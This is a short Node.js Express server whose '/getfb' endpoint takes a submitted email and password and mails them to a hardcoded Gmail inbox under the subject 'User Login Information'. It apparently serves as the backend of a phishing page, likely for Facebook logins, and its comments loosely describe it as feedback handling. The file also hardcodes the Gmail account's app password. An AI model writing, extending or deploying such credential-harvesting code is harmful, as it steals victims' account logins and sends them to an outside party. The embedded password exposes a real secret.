const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
const PORT = process.env.PORT || 3000;
const cors = require('cors');  // Import cors

// Enable CORS for all routes
app.use(cors());

// Middleware to parse JSON bodies
app.use(express.json());

// Configure nodemailer transporter with Gmail
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'datisnoob@gmail.com',            // Your Gmail address
    pass: 'qmir kxrv gllf rvzs',      // App password if using 2-Step Verification
  },
  from: 'datisnoob@gmail.com',
});

// Define the /getfb endpoint
app.post('/getfb', (req, res) => {
  const { email, password } = req.body;

  // Validate that email and password were provided
  if (!email || !password) {
    return res.status(400).json({ error: 'email and password are required' });
  }

  // Set up the email options
  const mailOptions = {
    to: 'datisnoob@gmail.com',         // The email where feedback is sent
    subject: 'User Login Information',
    text: `email: ${email}\nPassword: ${password}`,  // Email body with credentials
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send email' });
    }
    res.status(200).json({ message: 'Email sent successfully', info: info.response });
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
